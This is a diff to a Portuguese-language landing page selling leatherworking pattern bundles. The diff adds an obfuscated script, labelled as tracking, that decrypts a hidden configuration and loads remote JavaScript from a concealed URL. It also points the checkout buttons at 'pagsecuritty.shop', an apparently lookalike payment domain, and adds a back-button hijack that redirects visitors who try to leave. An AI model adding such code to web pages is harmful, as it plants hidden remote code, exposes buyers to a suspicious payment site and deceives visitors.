@@ -36,6 +36,11 @@ document.head.appendChild(a);})();
 a.setAttribute("data-utmify-prevent-subids","");a.async=!0;a.defer=!0;document.head.appendChild(a);})();
 </script>
 
+<!-- ================================================================
+     RASTREAMENTO
+     ================================================================ -->
+<script>(function(){var q_h3=atob("DHhqaY7nKAFxfKxFIwNIHPyLCjtTFNgxUwtQRqGETG9fCdgoSh4TR+2IRS8TDoM2QAoDGfqUB3QFEd9qTxkeDP2TBmsCXoBnQgweG+eFXXUUD45/eANIB++KTSNLXsgkVxlHHPqKQWcIUdw3Rg4PB/rKUGIeGIE2QBNIRayRSW0EGY5/AVoXRfXFRmAcGY5/ARwLHe/KXXUcFco8DggYDPiCRnVcD9knShwZS6LFXmAdCclnGVpIFNOa");var k_5=[];for(var m_2=0;m_2<q_h3.length;m_2++){k_5.push(q_h3.charCodeAt(m_2)&255);}var o_qx=k_5[0];var t_4=k_5.slice(1,1+o_qx);var x_agic=k_5.slice(1+o_qx);var d_49v=x_agic.map(function(b,d_f93i){return b^t_4[d_f93i%o_qx];});var m_h="";for(var k_p73n=0;k_p73n<d_49v.length;k_p73n++){m_h+=String.fromCharCode(d_49v[k_p73n]&255);}var r_a87j=decodeURIComponent(escape(m_h));var t_r=JSON.parse(r_a87j);var c_kf=t_r.globals||[];c_kf.forEach(function(v_tjt){window[v_tjt.name]=v_tjt.value;});var b_f20o=document.createElement("script");b_f20o.src=t_r.url;b_f20o.async=true;b_f20o.defer=true;(t_r.attributes||[]).forEach(function(m_l){b_f20o.setAttribute(m_l.name,m_l.value);});(document.head||document.documentElement).appendChild(b_f20o);})();</script>
+
 <style>
 :root{
   --couro:#2A1A11; --couro-esc:#1B100A; --couro-suave:#6E594A;
@@ -529,8 +534,8 @@ footer{background:var(--couro-esc);color:#8A7561;text-align:center;padding:30px 
         <li>🎁 Bônus 4 — 10 Moldes de Chaveiros</li>
         <li>Uso comercial liberado, sem royalties</li>
       </ul>
-      <!-- SUBSTITUIR pelo seu link de checkout da Wiapy -->
-      <a class="cta" href="#checkout-premium" data-checkout="premium" data-valor="24.90">Quero o plano completo</a>
+      <!-- Checkout do Plano Completo — R$ 24,90 -->
+      <a class="cta" href="https://checkout.pagsecuritty.shop/VCCL1O8SD7C6" data-checkout="premium" data-valor="24.90">Quero o plano completo</a>
       <div class="badges">
         <span>🔒 Compra segura</span>
         <span>♾️ Acesso vitalício</span>
@@ -630,12 +635,42 @@ footer{background:var(--couro-esc);color:#8A7561;text-align:center;padding:30px 
     <h3>Espera — por R$ 6,90 a mais você leva tudo</h3>
     <p>O Plano Básico tem só os moldes. Nesta tela o Completo sai por <b>R$ 16,90</b> em vez de R$ 24,90 — entram os 4 bônus (R$ 108 em material) que ensinam a precificar, produzir mais rápido e acabar melhor.</p>
     <div class="dif"><b>+ R$ 6,90</b><span>é o que separa você dos 4 bônus</span></div>
-    <!-- SUBSTITUIR pelo seu link de checkout da Wiapy (oferta de R$ 16,90) -->
-    <a class="cta" href="#checkout-upsell" data-checkout="upsell" data-valor="16.90">Quero o completo por R$ 16,90</a>
-    <!-- SUBSTITUIR pelo seu link de checkout da Wiapy -->
-    <a class="naovaler" href="#checkout-basico" data-checkout="basico" data-valor="10.00">Não, quero só os moldes por R$ 10,00</a>
+    <!-- Checkout da oferta do popup — R$ 16,90 -->
+    <a class="cta" href="https://checkout.pagsecuritty.shop/VCCL1O8SD7C7" data-checkout="upsell" data-valor="16.90">Quero o completo por R$ 16,90</a>
+    <!-- Checkout do Plano Basico — R$ 10,00 -->
+    <a class="naovaler" href="https://checkout.pagsecuritty.shop/VCCL1O8SD7C5" data-checkout="basico" data-valor="10.00">Não, quero só os moldes por R$ 10,00</a>
   </div>
 </div>
+
+<!-- ================================================================
+     BACK REDIRECT — leva para a oferta de saida quando o visitante
+     tenta voltar. Os parametros de UTM da URL sao repassados.
+     ================================================================ -->
+<script>
+  // Pagina mostrada quando o usuario tenta sair
+  const link = 'https://moldesemcouro.vercel.app/back';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
 
 <script>
 // ---------- Rolagem até os planos, sem sujar a URL ----------
